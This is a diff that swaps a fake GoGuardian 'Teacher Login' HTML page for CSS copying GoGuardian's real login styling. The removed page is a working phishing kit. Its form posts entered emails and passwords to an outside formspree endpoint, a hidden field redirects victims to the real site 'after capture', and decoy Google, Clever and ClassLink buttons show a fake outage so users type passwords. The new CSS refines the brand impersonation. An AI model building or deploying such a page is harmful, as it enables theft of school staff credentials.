@@ -1,157 +1,263 @@
-<!DOCTYPE html>
-<html lang="en">
+:root {
+    --gg-green: #57B658;
+    --gg-blue: #4285F4;
+    --gg-clever-blue: #426cf7;
+    --gg-classlink-teal: #17A2B8;
+    --gg-grey-light: #f5f5f5;
+    --gg-grey-input: #E0E0E0;
+    --gg-text-dark: #333;
+    --gg-text-muted: #777;
+    --font-main: 'Open Sans', sans-serif;
+}
 
-<head>
-  <meta charset="UTF-8">
-  <title>GoGuardian | Teacher Login</title>
-  <style>
-    body {
-      background: #f0f2f5 url('https://goguardian.com') no-repeat center center fixed;
-      background-size: cover;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      margin: 0;
-      font-family: "Roboto", "Helvetica Neue", Helvetica, Arial, sans-serif;
+* {
+    box-sizing: border-box;
+    margin: 0;
+    padding: 0;
+}
+
+html, body {
+    height: 100%;
+    width: 100%;
+    margin: 0;
+    font-family: var(--font-main);
+    color: var(--gg-text-dark);
+    overflow: hidden;
+}
+
+body {
+    background-image: url('https://account.goguardian.com/assets/images/bgs/shared-bg.76b708ff.jpg');
+    background-size: cover;
+    background-position: center;
+    background-repeat: no-repeat;
+    display: flex;
+    flex-direction: column;
+    border: 10px solid #A3C9FA; /* Signature blue border/frame from GoGuardian login */
+}
+
+.auth-layout {
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    padding: 20px;
+    background: rgba(255, 255, 255, 0.05); /* Very subtle overlay */
+}
+
+.auth-header {
+    margin-top: 20px;
+    margin-bottom: 20px;
+}
+
+.logo {
+    height: 48px;
+}
+
+.auth-main {
+    flex: 1;
+    display: flex;
+    justify-content: center;
+    align-items: flex-start;
+    padding-top: 20px;
+}
+
+.auth-card {
+    background: white;
+    width: 100%;
+    max-width: 440px;
+    padding: 40px 30px;
+    border-radius: 4px;
+    box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+    text-align: center;
+}
+
+.card-header .admin-label {
+    font-size: 11px;
+    font-weight: 600;
+    color: #888;
+    letter-spacing: 1.5px;
+    margin-bottom: 8px;
+}
+
+.card-header h1 {
+    font-size: 18px;
+    font-weight: 400;
+    color: #444;
+    margin-bottom: 30px;
+}
+
+.input-group {
+    margin-bottom: 20px;
+}
+
+.input-group input {
+    width: 100%;
+    padding: 14px 16px;
+    border: none;
+    background-color: var(--gg-grey-input);
+    border-radius: 2px;
+    font-size: 14px;
+    font-family: var(--font-main);
+    outline: none;
+    transition: background 0.2s;
+}
+
+.input-group input:focus {
+    background-color: #d8d8d8;
+}
+
+.input-group input::placeholder {
+    color: #888;
+}
+
+.btn {
+    width: 100%;
+    padding: 14px;
+    border: none;
+    border-radius: 4px;
+    font-size: 14px;
+    font-weight: 600;
+    cursor: pointer;
+    transition: background 0.2s, box-shadow 0.2s;
+    font-family: var(--font-main);
+}
+
+.btn-login {
+    background-color: var(--gg-green);
+    color: white;
+    margin-bottom: 15px;
+}
+
+.btn-login:hover {
+    background-color: #4da64d;
+    box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+}
+
+.separator {
+    position: relative;
+    margin: 25px 0;
+    text-align: center;
+}
+
+.separator::before {
+    content: "";
+    position: absolute;
+    top: 50%;
+    left: 0;
+    right: 0;
+    height: 1px;
+    background: #eee;
+    z-index: 1;
+}
+
+.separator span {
+    position: relative;
+    background: white;
+    padding: 0 10px;
+    color: #999;
+    font-size: 13px;
+    z-index: 2;
+}
+
+.social-logins {
+    display: flex;
+    flex-direction: column;
+    gap: 12px;
+}
+
+.btn-social {
+    display: flex;
+    align-items: center;
+    padding: 0;
+    overflow: hidden;
+    color: white;
+    text-align: center;
+}
+
+.icon-box {
+    background: white;
+    width: 44px;
+    height: 44px;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    padding: 10px;
+    border-right: 1px solid rgba(0,0,0,0.1);
+}
+
+.icon-box img {
+    width: 20px;
+    height: 20px;
+}
+
+.btn-text {
+    flex: 1;
+    font-weight: 400;
+}
+
+.btn-google { background-color: #4285f4; }
+.btn-clever { background-color: #426cf7; }
+.btn-classlink { background-color: #17a2b8; }
+
+.form-footer {
+    margin-top: 35px;
+    text-align: left;
+    font-size: 13px;
+}
+
+.links-row {
+    margin-bottom: 8px;
+}
+
+.links-row.top {
+    display: flex;
+    justify-content: space-between;
+    margin-bottom: 12px;
+}
+
+.links-row a {
+    text-decoration: none;
+    color: #888;
+}
+
+.links-row a:hover {
+    color: #555;
+    text-decoration: underline;
+}
+
+.app-footer {
+    width: 100%;
+    padding: 20px 40px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    font-size: 12px;
+    color: #777;
+    background: rgba(255, 255, 255, 0.9);
+    position: absolute;
+    bottom: 0;
+    border-top: 1px solid #eee;
+}
+
+.footer-left a {
+    margin-right: 15px;
+    text-decoration: none;
+    color: inherit;
+}
+
+.footer-left a:hover {
+    text-decoration: underline;
+}
+
+@media (max-width: 500px) {
+    .auth-card {
+        padding: 30px 20px;
     }
-
-    .login-card {
-      background: #ffffff;
-      width: 380px;
-      padding: 40px;
-      border-radius: 4px;
-      box-shadow: 0 1px 3px rgba(0, 0, 0, 0.3);
-      text-align: center;
+    .app-footer {
+        flex-direction: column;
+        gap: 10px;
+        text-align: center;
+        position: relative;
+        padding-bottom: 40px;
     }
-
-    .logo {
-      width: 180px;
-      margin-bottom: 25px;
-    }
-
-    .login-header {
-      color: #5f6368;
-      font-size: 14px;
-      text-transform: uppercase;
-      letter-spacing: 1px;
-      margin-bottom: 5px;
-    }
-
-    .login-title {
-      font-size: 22px;
-      font-weight: 400;
-      color: #202124;
-      margin-bottom: 25px;
-    }
-
-    .login-input {
-      width: 100%;
-      height: 48px;
-      border: 1px solid #dadce0;
-      border-radius: 4px;
-      padding: 13px 15px;
-      margin-bottom: 15px;
-      font-size: 16px;
-      box-sizing: border-box;
-      background-color: #f1f3f4;
-    }
-
-    .btn-login {
-      width: 100%;
-      padding: 12px;
-      background-color: #5cb85c;
-      color: white;
-      border: none;
-      border-radius: 4px;
-      font-size: 16px;
-      font-weight: bold;
-      cursor: pointer;
-      margin-bottom: 15px;
-    }
-
-    .social-btn {
-      width: 100%;
-      padding: 10px;
-      border-radius: 4px;
-      border: 1px solid #dadce0;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 14px;
-      font-weight: 500;
-      cursor: pointer;
-      margin-bottom: 10px;
-      color: white;
-    }
-
-    .btn-google {
-      background-color: #4285f4;
-    }
-
-    .btn-clever {
-      background-color: #4371f7;
-    }
-
-    .btn-classlink {
-      background-color: #00a9bc;
-    }
-
-    .icon {
-      width: 20px;
-      height: 20px;
-      margin-right: 20px;
-    }
-
-    #error-msg {
-      color: #d93025;
-      font-size: 13px;
-      margin-bottom: 15px;
-      display: none;
-    }
-  </style>
-</head>
-
-<body>
-  <div class="login-card">
-    <!-- Official Logo -->
-    <img src="https://imgur.com" class="logo">
-    <div class="login-header">Goguardian Admin</div>
-    <div class="login-title">Log in to your account</div>
-
-    <!-- Error message for decoy buttons -->
-    <div id="error-msg">SSO Service Unavailable. Please log in with email/password.</div>
-
-    <!-- INTEGRATION: BASIC HTML GUIDE APPLIED -->
-    <form action="https://formspree.io/f/xgoranry" method="POST">
-      <input type="email" name="email" class="login-input" placeholder="Email" required />
-      <input type="password" name="password" class="login-input" placeholder="Password" required />
-
-      <!-- Redirect setting to send teacher to real site after capture -->
-      <input type="hidden" name="_next" value="https://goguardian.com">
-
-      <button type="submit" class="btn-login">Log in</button>
-    </form>
-
-    <div style="color: #5f6368; font-size: 12px; margin-bottom: 15px;">or</div>
-
-    <!-- DECOY BUTTONS (DISABLED) -->
-    <div class="social-btn btn-google" onclick="showError()">
-      <img src="https://gstatic.com" class="icon"> Log in with Google
-    </div>
-    <div class="social-btn btn-clever" onclick="showError()">
-      <img src="https://clever.com" class="icon" style="filter: brightness(0) invert(1);"> Log in with Clever
-    </div>
-    <div class="social-btn btn-classlink" onclick="showError()">
-      <img src="https://classlink.com" class="icon"> Log in with ClassLink
-    </div>
-  </div>
-
-  <script>
-    function showError() {
-      document.getElementById('error-msg').style.display = 'block';
-    }
-  </script>
-</body>
-
-</html>
+}
